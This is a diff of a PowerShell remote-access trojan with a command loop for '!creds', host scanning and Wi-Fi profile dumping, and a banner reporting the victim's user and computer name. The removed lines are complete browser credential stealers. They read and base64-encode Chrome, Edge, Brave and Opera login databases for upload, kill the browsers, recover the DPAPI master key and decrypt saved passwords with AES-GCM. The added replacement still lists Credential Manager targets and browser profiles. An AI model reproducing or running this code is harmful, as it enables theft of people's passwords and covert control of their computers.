@@ -388,126 +388,38 @@ function PortSuggest {
         return "[DOWNLOADED] $out"
     }
 
-
-    
-
-    function Send-RawCredFiles {
-    $browsers = @{
-        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-        "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
-        "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
-        "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
-    }
-
-    $result = ""
-
-    foreach ($name in $browsers.Keys) {
-        $base = $browsers[$name]
-        $login = Join-Path $base "Login Data"
-        $state = Join-Path (Split-Path $base -Parent) "Local State"
-
-        if ((Test-Path $login) -and (Test-Path $state)) {
-            try {
-                $login_b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($login))
-                $state_b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($state))
-                $result += "[UPLOAD]::${name}_LoginData::${login_b64}::END`n"
-                $result += "[UPLOAD]::${name}_LocalState::${state_b64}::END`n"
-            } catch {
-                $result += "[ERROR] Failed to read files for $name: $($_.Exception.Message)`n"
-            }
-        }
-    }
-
-    return $result
-}
-
-
-function Send-DecryptedBrowserCreds {
+    function Get-Credentials {
     try {
-        # Завершаем все браузеры
-        $browsers = @("chrome", "msedge", "brave", "opera")
-        foreach ($b in $browsers) { Stop-Process -Name $b -Force -ErrorAction SilentlyContinue }
-        Start-Sleep -Seconds 2
+        $output = ""
 
-        Add-Type -AssemblyName System.Security
-        Add-Type -AssemblyName System.Web
-
-        $browsersPaths = @{
-            "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-            "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
-            "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
-            "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
+        # 1. Windows Credential Manager (generic credentials)
+        $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
+            $target = $_.ToString().Split(":")[1].Trim()
+            $output += "`n[TARGET] $target"
         }
 
-        function Get-MasterKey($localStatePath) {
-            $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
-            $encKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
-            $encKey = $encKey[5..($encKey.Length-1)]
-            return [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
+        # 2. Chrome saved logins (мета-данные — без дешифровки)
+        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromeLoginPath) {
+            $output += "`n[+] Chrome login database found: $chromeLoginPath"
         }
 
-        function Decrypt-Pass($buff, $key) {
-            if ($buff[0..2] -ne [byte[]](0x76, 0x31, 0x30) -and $buff[0..2] -ne [byte[]](0x76, 0x31, 0x31)) {
-                return "[Legacy/Plain]"
-            }
-            $iv = $buff[3..14]
-            $payload = $buff[15..($buff.Length - 17)]
-            $tag = $buff[($buff.Length - 16)..($buff.Length - 1)]
-            $cipher = New-Object System.Security.Cryptography.AesGcm $key
-            $plaintext = New-Object byte[] $payload.Length
-            try {
-                $cipher.Decrypt($iv, $payload, $tag, $plaintext)
-                return [System.Text.Encoding]::UTF8.GetString($plaintext)
-            } catch {
-                return "[Decrypt error]"
-            }
+        # 3. Firefox профили (только список профилей)
+        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
+        foreach ($profile in $firefoxProfiles) {
+            $output += "`n[+] Firefox profile: $($profile.FullName)"
         }
 
-        $out = "[CREDS]::"
-
-        foreach ($browser in $browsersPaths.Keys) {
-            $profilePath = $browsersPaths[$browser]
-            $loginData = Join-Path $profilePath "Login Data"
-            $localState = Join-Path (Split-Path $profilePath -Parent) "Local State"
-
-            if (!(Test-Path $loginData) -or !(Test-Path $localState)) { continue }
-
-            $tempDB = "$env:TEMP\LoginData_$browser.db"
-            Copy-Item $loginData $tempDB -Force
-            $key = Get-MasterKey $localState
-
-            $conn = New-Object -ComObject "ADODB.Connection"
-            $conn.ConnectionString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempDB;Persist Security Info=False;"
-            $conn.Open()
-
-            $cmd = New-Object -ComObject "ADODB.Command"
-            $cmd.ActiveConnection = $conn
-            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-            $rs = $cmd.Execute()
-
-            while (!$rs.EOF) {
-                $url = $rs.Fields.Item(0).Value
-                $user = $rs.Fields.Item(1).Value
-                $enc = $rs.Fields.Item(2).Value
-                $pass = Decrypt-Pass $enc $key
-                $out += "`n[$browser] $url | $user | $pass"
-                $rs.MoveNext()
-            }
-
-            $rs.Close()
-            $conn.Close()
-            Remove-Item $tempDB -Force -ErrorAction SilentlyContinue
+        if ([string]::IsNullOrWhiteSpace($output)) {
+            return "[INFO] No credentials found or access denied."
         }
 
-        $out += "::END"
-        return $out
-    } catch {
-        return "[ERROR] $($_.Exception.Message)"
+        return $output
+    }
+    catch {
+        return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
 }
-
-
-    
     
     function Dump-WiFi {
     netsh wlan show profiles | ForEach-Object {
@@ -723,7 +635,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            F                                                                                                                                                                  
+                                            TEST 4                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
@@ -782,7 +694,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!creds") {
-                        $response = Send-RawCredFiles
+                        $response = Get-Credentials
                     }
                     elseif ($cmd -eq "scanHosts") {
                         Get-AliveHosts -stream $stream
